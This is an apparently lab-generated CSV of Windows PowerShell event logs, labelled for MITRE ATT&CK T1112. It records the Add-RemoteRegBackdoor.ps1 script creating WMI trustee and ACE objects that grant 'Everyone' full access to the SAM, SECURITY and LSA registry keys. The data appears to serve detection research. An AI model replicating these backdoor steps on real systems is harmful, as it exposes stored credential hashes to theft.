41,54745,2021-12-09 19:54:03.0000000,800,Info,PowerShell,Windows PowerShell,0,0,fs03vuln.offsec.lan,1,,Pipeline Execution Details,,,"HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
","HostName=ConsoleHost
","HostVersion=4.0
",,,,,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""            $RegTrustee = (New-Object System.Management.ManagementClass('win32_Trustee')).CreateInstance()\n, \tDetailSequence=1\n\tDetailTotal=1\n\n\tSequenceNumber=1093\n\n\tUserId=OFFSEC\\hack1\n\tHostName=ConsoleHost\n\tHostVersion=4.0\n\tHostId=a991c134-2e90-418c-940d-258271dd1e9c\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n\tEngineVersion=4.0\n\tRunspaceId=4315d698-493e-410a-8e70-1c07123fdca4\n\tPipelineId=88\n\tScriptName=C:\\TOOLS\\Add-RemoteRegBackdoor.ps1\n\tCommandLine=            $RegTrustee = (New-Object System.Management.ManagementClass('win32_Trustee')).CreateInstance()\n, CommandInvocation(New-Object): \""New-Object\""\nParameterBinding(New-Object): name=\""TypeName\""; value=\""System.Management.ManagementClass\""\nParameterBinding(New-Object): name=\""ArgumentList\""; value=\""win32_Trustee\""\n"",""Binary"":""""}}"
42,54746,2021-12-09 19:54:03.0000000,800,Info,PowerShell,Windows PowerShell,0,0,fs03vuln.offsec.lan,1,,Pipeline Execution Details,,,"HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
","HostName=ConsoleHost
","HostVersion=4.0
",,,,,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""            Write-Verbose \""[$Computer : $Key] Applying Trustee to new Ace\""\n, \tDetailSequence=1\n\tDetailTotal=1\n\n\tSequenceNumber=1095\n\n\tUserId=OFFSEC\\hack1\n\tHostName=ConsoleHost\n\tHostVersion=4.0\n\tHostId=a991c134-2e90-418c-940d-258271dd1e9c\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n\tEngineVersion=4.0\n\tRunspaceId=4315d698-493e-410a-8e70-1c07123fdca4\n\tPipelineId=88\n\tScriptName=C:\\TOOLS\\Add-RemoteRegBackdoor.ps1\n\tCommandLine=            Write-Verbose \""[$Computer : $Key] Applying Trustee to new Ace\""\n, CommandInvocation(Write-Verbose): \""Write-Verbose\""\nParameterBinding(Write-Verbose): name=\""Message\""; value=\""[FS03 : SYSTEM\\CurrentControlSet\\Control\\Lsa\\GBG] Applying Trustee to new Ace\""\n"",""Binary"":""""}}"
43,54747,2021-12-09 19:54:03.0000000,800,Info,PowerShell,Windows PowerShell,0,0,fs03vuln.offsec.lan,1,,Pipeline Execution Details,,,"HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
","HostName=ConsoleHost
","HostVersion=4.0
",,,,,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""            Write-Verbose \""[$Computer : $Key] Calling SetSecurityDescriptor on the key with the newly created Ace\""\n, \tDetailSequence=1\n\tDetailTotal=1\n\n\tSequenceNumber=1097\n\n\tUserId=OFFSEC\\hack1\n\tHostName=ConsoleHost\n\tHostVersion=4.0\n\tHostId=a991c134-2e90-418c-940d-258271dd1e9c\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n\tEngineVersion=4.0\n\tRunspaceId=4315d698-493e-410a-8e70-1c07123fdca4\n\tPipelineId=88\n\tScriptName=C:\\TOOLS\\Add-RemoteRegBackdoor.ps1\n\tCommandLine=            Write-Verbose \""[$Computer : $Key] Calling SetSecurityDescriptor on the key with the newly created Ace\""\n, CommandInvocation(Write-Verbose): \""Write-Verbose\""\nParameterBinding(Write-Verbose): name=\""Message\""; value=\""[FS03 : SYSTEM\\CurrentControlSet\\Control\\Lsa\\GBG] Calling SetSecurityDescriptor on the key with the newly created Ace\""\n"",""Binary"":""""}}"
44,54748,2021-12-09 19:54:03.0000000,800,Info,PowerShell,Windows PowerShell,0,0,fs03vuln.offsec.lan,1,,Pipeline Execution Details,,,"HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
","HostName=ConsoleHost
","HostVersion=4.0
",,,,,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""            Write-Verbose \""[$Computer : $Key] Backdooring completed for key\""\n, \tDetailSequence=1\n\tDetailTotal=1\n\n\tSequenceNumber=1099\n\n\tUserId=OFFSEC\\hack1\n\tHostName=ConsoleHost\n\tHostVersion=4.0\n\tHostId=a991c134-2e90-418c-940d-258271dd1e9c\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n\tEngineVersion=4.0\n\tRunspaceId=4315d698-493e-410a-8e70-1c07123fdca4\n\tPipelineId=88\n\tScriptName=C:\\TOOLS\\Add-RemoteRegBackdoor.ps1\n\tCommandLine=            Write-Verbose \""[$Computer : $Key] Backdooring completed for key\""\n, CommandInvocation(Write-Verbose): \""Write-Verbose\""\nParameterBinding(Write-Verbose): name=\""Message\""; value=\""[FS03 : SYSTEM\\CurrentControlSet\\Control\\Lsa\\GBG] Backdooring completed for key\""\n"",""Binary"":""""}}"
45,54749,2021-12-09 19:54:03.0000000,800,Info,PowerShell,Windows PowerShell,0,0,fs03vuln.offsec.lan,1,,Pipeline Execution Details,,,"HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
","HostName=ConsoleHost
","HostVersion=4.0
",,,,,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""            Write-Verbose \""[$Computer : $Key] Backdooring started for key\""\n, \tDetailSequence=1\n\tDetailTotal=1\n\n\tSequenceNumber=1101\n\n\tUserId=OFFSEC\\hack1\n\tHostName=ConsoleHost\n\tHostVersion=4.0\n\tHostId=a991c134-2e90-418c-940d-258271dd1e9c\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n\tEngineVersion=4.0\n\tRunspaceId=4315d698-493e-410a-8e70-1c07123fdca4\n\tPipelineId=88\n\tScriptName=C:\\TOOLS\\Add-RemoteRegBackdoor.ps1\n\tCommandLine=            Write-Verbose \""[$Computer : $Key] Backdooring started for key\""\n, CommandInvocation(Write-Verbose): \""Write-Verbose\""\nParameterBinding(Write-Verbose): name=\""Message\""; value=\""[FS03 : SECURITY] Backdooring started for key\""\n"",""Binary"":""""}}"
46,54750,2021-12-09 19:54:03.0000000,800,Info,PowerShell,Windows PowerShell,0,0,fs03vuln.offsec.lan,1,,Pipeline Execution Details,,,"HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
","HostName=ConsoleHost
","HostVersion=4.0
",,,,,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""            Write-Verbose \""[$Computer : $Key] Creating ACE with Access Mask of 983103 (ALL_ACCESS) and AceFlags of 2 (CONTAINER_INHERIT_ACE)\""\n, \tDetailSequence=1\n\tDetailTotal=1\n\n\tSequenceNumber=1103\n\n\tUserId=OFFSEC\\hack1\n\tHostName=ConsoleHost\n\tHostVersion=4.0\n\tHostId=a991c134-2e90-418c-940d-258271dd1e9c\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n\tEngineVersion=4.0\n\tRunspaceId=4315d698-493e-410a-8e70-1c07123fdca4\n\tPipelineId=88\n\tScriptName=C:\\TOOLS\\Add-RemoteRegBackdoor.ps1\n\tCommandLine=            Write-Verbose \""[$Computer : $Key] Creating ACE with Access Mask of 983103 (ALL_ACCESS) and AceFlags of 2 (CONTAINER_INHERIT_ACE)\""\n, CommandInvocation(Write-Verbose): \""Write-Verbose\""\nParameterBinding(Write-Verbose): name=\""Message\""; value=\""[FS03 : SECURITY] Creating ACE with Access Mask of 983103 (ALL_ACCESS) and AceFlags of 2 (CONTAINER_INHERIT_ACE)\""\n"",""Binary"":""""}}"
47,54751,2021-12-09 19:54:03.0000000,800,Info,PowerShell,Windows PowerShell,0,0,fs03vuln.offsec.lan,1,,Pipeline Execution Details,,,"HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
","HostName=ConsoleHost
","HostVersion=4.0
",,,,,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""            $RegAce = (New-Object System.Management.ManagementClass('win32_Ace')).CreateInstance()\n, \tDetailSequence=1\n\tDetailTotal=1\n\n\tSequenceNumber=1105\n\n\tUserId=OFFSEC\\hack1\n\tHostName=ConsoleHost\n\tHostVersion=4.0\n\tHostId=a991c134-2e90-418c-940d-258271dd1e9c\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n\tEngineVersion=4.0\n\tRunspaceId=4315d698-493e-410a-8e70-1c07123fdca4\n\tPipelineId=88\n\tScriptName=C:\\TOOLS\\Add-RemoteRegBackdoor.ps1\n\tCommandLine=            $RegAce = (New-Object System.Management.ManagementClass('win32_Ace')).CreateInstance()\n, CommandInvocation(New-Object): \""New-Object\""\nParameterBinding(New-Object): name=\""TypeName\""; value=\""System.Management.ManagementClass\""\nParameterBinding(New-Object): name=\""ArgumentList\""; value=\""win32_Ace\""\n"",""Binary"":""""}}"
48,54752,2021-12-09 19:54:03.0000000,800,Info,PowerShell,Windows PowerShell,0,0,fs03vuln.offsec.lan,1,,Pipeline Execution Details,,,"HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
","HostName=ConsoleHost
","HostVersion=4.0
",,,,,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""            Write-Verbose \""[$Computer : $Key] Creating the trustee WMI object with user '$User'\""\n, \tDetailSequence=1\n\tDetailTotal=1\n\n\tSequenceNumber=1107\n\n\tUserId=OFFSEC\\hack1\n\tHostName=ConsoleHost\n\tHostVersion=4.0\n\tHostId=a991c134-2e90-418c-940d-258271dd1e9c\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n\tEngineVersion=4.0\n\tRunspaceId=4315d698-493e-410a-8e70-1c07123fdca4\n\tPipelineId=88\n\tScriptName=C:\\TOOLS\\Add-RemoteRegBackdoor.ps1\n\tCommandLine=            Write-Verbose \""[$Computer : $Key] Creating the trustee WMI object with user '$User'\""\n, CommandInvocation(Write-Verbose): \""Write-Verbose\""\nParameterBinding(Write-Verbose): name=\""Message\""; value=\""[FS03 : SECURITY] Creating the trustee WMI object with user 'Everyone'\""\n"",""Binary"":""""}}"
49,54753,2021-12-09 19:54:03.0000000,800,Info,PowerShell,Windows PowerShell,0,0,fs03vuln.offsec.lan,1,,Pipeline Execution Details,,,"HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
","HostName=ConsoleHost
","HostVersion=4.0
",,,,,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""            $RegTrustee = (New-Object System.Management.ManagementClass('win32_Trustee')).CreateInstance()\n, \tDetailSequence=1\n\tDetailTotal=1\n\n\tSequenceNumber=1109\n\n\tUserId=OFFSEC\\hack1\n\tHostName=ConsoleHost\n\tHostVersion=4.0\n\tHostId=a991c134-2e90-418c-940d-258271dd1e9c\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n\tEngineVersion=4.0\n\tRunspaceId=4315d698-493e-410a-8e70-1c07123fdca4\n\tPipelineId=88\n\tScriptName=C:\\TOOLS\\Add-RemoteRegBackdoor.ps1\n\tCommandLine=            $RegTrustee = (New-Object System.Management.ManagementClass('win32_Trustee')).CreateInstance()\n, CommandInvocation(New-Object): \""New-Object\""\nParameterBinding(New-Object): name=\""TypeName\""; value=\""System.Management.ManagementClass\""\nParameterBinding(New-Object): name=\""ArgumentList\""; value=\""win32_Trustee\""\n"",""Binary"":""""}}"
50,54754,2021-12-09 19:54:03.0000000,800,Info,PowerShell,Windows PowerShell,0,0,fs03vuln.offsec.lan,1,,Pipeline Execution Details,,,"HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
","HostName=ConsoleHost
","HostVersion=4.0
",,,,,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""            Write-Verbose \""[$Computer : $Key] Applying Trustee to new Ace\""\n, \tDetailSequence=1\n\tDetailTotal=1\n\n\tSequenceNumber=1111\n\n\tUserId=OFFSEC\\hack1\n\tHostName=ConsoleHost\n\tHostVersion=4.0\n\tHostId=a991c134-2e90-418c-940d-258271dd1e9c\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n\tEngineVersion=4.0\n\tRunspaceId=4315d698-493e-410a-8e70-1c07123fdca4\n\tPipelineId=88\n\tScriptName=C:\\TOOLS\\Add-RemoteRegBackdoor.ps1\n\tCommandLine=            Write-Verbose \""[$Computer : $Key] Applying Trustee to new Ace\""\n, CommandInvocation(Write-Verbose): \""Write-Verbose\""\nParameterBinding(Write-Verbose): name=\""Message\""; value=\""[FS03 : SECURITY] Applying Trustee to new Ace\""\n"",""Binary"":""""}}"
51,54755,2021-12-09 19:54:03.0000000,800,Info,PowerShell,Windows PowerShell,0,0,fs03vuln.offsec.lan,1,,Pipeline Execution Details,,,"HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
","HostName=ConsoleHost
","HostVersion=4.0
",,,,,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""            Write-Verbose \""[$Computer : $Key] Calling SetSecurityDescriptor on the key with the newly created Ace\""\n, \tDetailSequence=1\n\tDetailTotal=1\n\n\tSequenceNumber=1113\n\n\tUserId=OFFSEC\\hack1\n\tHostName=ConsoleHost\n\tHostVersion=4.0\n\tHostId=a991c134-2e90-418c-940d-258271dd1e9c\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n\tEngineVersion=4.0\n\tRunspaceId=4315d698-493e-410a-8e70-1c07123fdca4\n\tPipelineId=88\n\tScriptName=C:\\TOOLS\\Add-RemoteRegBackdoor.ps1\n\tCommandLine=            Write-Verbose \""[$Computer : $Key] Calling SetSecurityDescriptor on the key with the newly created Ace\""\n, CommandInvocation(Write-Verbose): \""Write-Verbose\""\nParameterBinding(Write-Verbose): name=\""Message\""; value=\""[FS03 : SECURITY] Calling SetSecurityDescriptor on the key with the newly created Ace\""\n"",""Binary"":""""}}"
52,54756,2021-12-09 19:54:03.0000000,800,Info,PowerShell,Windows PowerShell,0,0,fs03vuln.offsec.lan,1,,Pipeline Execution Details,,,"HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
","HostName=ConsoleHost
","HostVersion=4.0
",,,,,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""            Write-Verbose \""[$Computer : $Key] Backdooring completed for key\""\n, \tDetailSequence=1\n\tDetailTotal=1\n\n\tSequenceNumber=1115\n\n\tUserId=OFFSEC\\hack1\n\tHostName=ConsoleHost\n\tHostVersion=4.0\n\tHostId=a991c134-2e90-418c-940d-258271dd1e9c\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n\tEngineVersion=4.0\n\tRunspaceId=4315d698-493e-410a-8e70-1c07123fdca4\n\tPipelineId=88\n\tScriptName=C:\\TOOLS\\Add-RemoteRegBackdoor.ps1\n\tCommandLine=            Write-Verbose \""[$Computer : $Key] Backdooring completed for key\""\n, CommandInvocation(Write-Verbose): \""Write-Verbose\""\nParameterBinding(Write-Verbose): name=\""Message\""; value=\""[FS03 : SECURITY] Backdooring completed for key\""\n"",""Binary"":""""}}"
53,54757,2021-12-09 19:54:03.0000000,800,Info,PowerShell,Windows PowerShell,0,0,fs03vuln.offsec.lan,1,,Pipeline Execution Details,,,"HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
","HostName=ConsoleHost
","HostVersion=4.0
",,,,,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""            Write-Verbose \""[$Computer : $Key] Backdooring started for key\""\n, \tDetailSequence=1\n\tDetailTotal=1\n\n\tSequenceNumber=1117\n\n\tUserId=OFFSEC\\hack1\n\tHostName=ConsoleHost\n\tHostVersion=4.0\n\tHostId=a991c134-2e90-418c-940d-258271dd1e9c\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n\tEngineVersion=4.0\n\tRunspaceId=4315d698-493e-410a-8e70-1c07123fdca4\n\tPipelineId=88\n\tScriptName=C:\\TOOLS\\Add-RemoteRegBackdoor.ps1\n\tCommandLine=            Write-Verbose \""[$Computer : $Key] Backdooring started for key\""\n, CommandInvocation(Write-Verbose): \""Write-Verbose\""\nParameterBinding(Write-Verbose): name=\""Message\""; value=\""[FS03 : SAM\\SAM\\Domains\\Account] Backdooring started for key\""\n"",""Binary"":""""}}"
54,54758,2021-12-09 19:54:03.0000000,800,Info,PowerShell,Windows PowerShell,0,0,fs03vuln.offsec.lan,1,,Pipeline Execution Details,,,"HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
","HostName=ConsoleHost
","HostVersion=4.0
",,,,,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""            Write-Verbose \""[$Computer : $Key] Creating ACE with Access Mask of 983103 (ALL_ACCESS) and AceFlags of 2 (CONTAINER_INHERIT_ACE)\""\n, \tDetailSequence=1\n\tDetailTotal=1\n\n\tSequenceNumber=1119\n\n\tUserId=OFFSEC\\hack1\n\tHostName=ConsoleHost\n\tHostVersion=4.0\n\tHostId=a991c134-2e90-418c-940d-258271dd1e9c\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n\tEngineVersion=4.0\n\tRunspaceId=4315d698-493e-410a-8e70-1c07123fdca4\n\tPipelineId=88\n\tScriptName=C:\\TOOLS\\Add-RemoteRegBackdoor.ps1\n\tCommandLine=            Write-Verbose \""[$Computer : $Key] Creating ACE with Access Mask of 983103 (ALL_ACCESS) and AceFlags of 2 (CONTAINER_INHERIT_ACE)\""\n, CommandInvocation(Write-Verbose): \""Write-Verbose\""\nParameterBinding(Write-Verbose): name=\""Message\""; value=\""[FS03 : SAM\\SAM\\Domains\\Account] Creating ACE with Access Mask of 983103 (ALL_ACCESS) and AceFlags of 2 (CONTAINER_INHERIT_ACE)\""\n"",""Binary"":""""}}"
55,54759,2021-12-09 19:54:03.0000000,800,Info,PowerShell,Windows PowerShell,0,0,fs03vuln.offsec.lan,1,,Pipeline Execution Details,,,"HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
","HostName=ConsoleHost
","HostVersion=4.0
",,,,,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""            $RegAce = (New-Object System.Management.ManagementClass('win32_Ace')).CreateInstance()\n, \tDetailSequence=1\n\tDetailTotal=1\n\n\tSequenceNumber=1121\n\n\tUserId=OFFSEC\\hack1\n\tHostName=ConsoleHost\n\tHostVersion=4.0\n\tHostId=a991c134-2e90-418c-940d-258271dd1e9c\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n\tEngineVersion=4.0\n\tRunspaceId=4315d698-493e-410a-8e70-1c07123fdca4\n\tPipelineId=88\n\tScriptName=C:\\TOOLS\\Add-RemoteRegBackdoor.ps1\n\tCommandLine=            $RegAce = (New-Object System.Management.ManagementClass('win32_Ace')).CreateInstance()\n, CommandInvocation(New-Object): \""New-Object\""\nParameterBinding(New-Object): name=\""TypeName\""; value=\""System.Management.ManagementClass\""\nParameterBinding(New-Object): name=\""ArgumentList\""; value=\""win32_Ace\""\n"",""Binary"":""""}}"
56,54760,2021-12-09 19:54:03.0000000,800,Info,PowerShell,Windows PowerShell,0,0,fs03vuln.offsec.lan,1,,Pipeline Execution Details,,,"HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
","HostName=ConsoleHost
","HostVersion=4.0
",,,,,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""            Write-Verbose \""[$Computer : $Key] Creating the trustee WMI object with user '$User'\""\n, \tDetailSequence=1\n\tDetailTotal=1\n\n\tSequenceNumber=1123\n\n\tUserId=OFFSEC\\hack1\n\tHostName=ConsoleHost\n\tHostVersion=4.0\n\tHostId=a991c134-2e90-418c-940d-258271dd1e9c\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n\tEngineVersion=4.0\n\tRunspaceId=4315d698-493e-410a-8e70-1c07123fdca4\n\tPipelineId=88\n\tScriptName=C:\\TOOLS\\Add-RemoteRegBackdoor.ps1\n\tCommandLine=            Write-Verbose \""[$Computer : $Key] Creating the trustee WMI object with user '$User'\""\n, CommandInvocation(Write-Verbose): \""Write-Verbose\""\nParameterBinding(Write-Verbose): name=\""Message\""; value=\""[FS03 : SAM\\SAM\\Domains\\Account] Creating the trustee WMI object with user 'Everyone'\""\n"",""Binary"":""""}}"
57,54761,2021-12-09 19:54:03.0000000,800,Info,PowerShell,Windows PowerShell,0,0,fs03vuln.offsec.lan,1,,Pipeline Execution Details,,,"HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
","HostName=ConsoleHost
","HostVersion=4.0
",,,,,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""            $RegTrustee = (New-Object System.Management.ManagementClass('win32_Trustee')).CreateInstance()\n, \tDetailSequence=1\n\tDetailTotal=1\n\n\tSequenceNumber=1125\n\n\tUserId=OFFSEC\\hack1\n\tHostName=ConsoleHost\n\tHostVersion=4.0\n\tHostId=a991c134-2e90-418c-940d-258271dd1e9c\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n\tEngineVersion=4.0\n\tRunspaceId=4315d698-493e-410a-8e70-1c07123fdca4\n\tPipelineId=88\n\tScriptName=C:\\TOOLS\\Add-RemoteRegBackdoor.ps1\n\tCommandLine=            $RegTrustee = (New-Object System.Management.ManagementClass('win32_Trustee')).CreateInstance()\n, CommandInvocation(New-Object): \""New-Object\""\nParameterBinding(New-Object): name=\""TypeName\""; value=\""System.Management.ManagementClass\""\nParameterBinding(New-Object): name=\""ArgumentList\""; value=\""win32_Trustee\""\n"",""Binary"":""""}}"
58,54762,2021-12-09 19:54:03.0000000,800,Info,PowerShell,Windows PowerShell,0,0,fs03vuln.offsec.lan,1,,Pipeline Execution Details,,,"HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
","HostName=ConsoleHost
","HostVersion=4.0
",,,,,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""            Write-Verbose \""[$Computer : $Key] Applying Trustee to new Ace\""\n, \tDetailSequence=1\n\tDetailTotal=1\n\n\tSequenceNumber=1127\n\n\tUserId=OFFSEC\\hack1\n\tHostName=ConsoleHost\n\tHostVersion=4.0\n\tHostId=a991c134-2e90-418c-940d-258271dd1e9c\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n\tEngineVersion=4.0\n\tRunspaceId=4315d698-493e-410a-8e70-1c07123fdca4\n\tPipelineId=88\n\tScriptName=C:\\TOOLS\\Add-RemoteRegBackdoor.ps1\n\tCommandLine=            Write-Verbose \""[$Computer : $Key] Applying Trustee to new Ace\""\n, CommandInvocation(Write-Verbose): \""Write-Verbose\""\nParameterBinding(Write-Verbose): name=\""Message\""; value=\""[FS03 : SAM\\SAM\\Domains\\Account] Applying Trustee to new Ace\""\n"",""Binary"":""""}}"
59,54763,2021-12-09 19:54:03.0000000,800,Info,PowerShell,Windows PowerShell,0,0,fs03vuln.offsec.lan,1,,Pipeline Execution Details,,,"HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
","HostName=ConsoleHost
","HostVersion=4.0
",,,,,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""            Write-Verbose \""[$Computer : $Key] Calling SetSecurityDescriptor on the key with the newly created Ace\""\n, \tDetailSequence=1\n\tDetailTotal=1\n\n\tSequenceNumber=1129\n\n\tUserId=OFFSEC\\hack1\n\tHostName=ConsoleHost\n\tHostVersion=4.0\n\tHostId=a991c134-2e90-418c-940d-258271dd1e9c\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n\tEngineVersion=4.0\n\tRunspaceId=4315d698-493e-410a-8e70-1c07123fdca4\n\tPipelineId=88\n\tScriptName=C:\\TOOLS\\Add-RemoteRegBackdoor.ps1\n\tCommandLine=            Write-Verbose \""[$Computer : $Key] Calling SetSecurityDescriptor on the key with the newly created Ace\""\n, CommandInvocation(Write-Verbose): \""Write-Verbose\""\nParameterBinding(Write-Verbose): name=\""Message\""; value=\""[FS03 : SAM\\SAM\\Domains\\Account] Calling SetSecurityDescriptor on the key with the newly created Ace\""\n"",""Binary"":""""}}"
60,54764,2021-12-09 19:54:03.0000000,800,Info,PowerShell,Windows PowerShell,0,0,fs03vuln.offsec.lan,1,,Pipeline Execution Details,,,"HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
","HostName=ConsoleHost
","HostVersion=4.0
",,,,,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""            Write-Verbose \""[$Computer : $Key] Backdooring completed for key\""\n, \tDetailSequence=1\n\tDetailTotal=1\n\n\tSequenceNumber=1131\n\n\tUserId=OFFSEC\\hack1\n\tHostName=ConsoleHost\n\tHostVersion=4.0\n\tHostId=a991c134-2e90-418c-940d-258271dd1e9c\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n\tEngineVersion=4.0\n\tRunspaceId=4315d698-493e-410a-8e70-1c07123fdca4\n\tPipelineId=88\n\tScriptName=C:\\TOOLS\\Add-RemoteRegBackdoor.ps1\n\tCommandLine=            Write-Verbose \""[$Computer : $Key] Backdooring completed for key\""\n, CommandInvocation(Write-Verbose): \""Write-Verbose\""\nParameterBinding(Write-Verbose): name=\""Message\""; value=\""[FS03 : SAM\\SAM\\Domains\\Account] Backdooring completed for key\""\n"",""Binary"":""""}}"
61,54765,2021-12-09 19:54:03.0000000,800,Info,PowerShell,Windows PowerShell,0,0,fs03vuln.offsec.lan,1,,Pipeline Execution Details,,,"HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
","HostName=ConsoleHost
","HostVersion=4.0
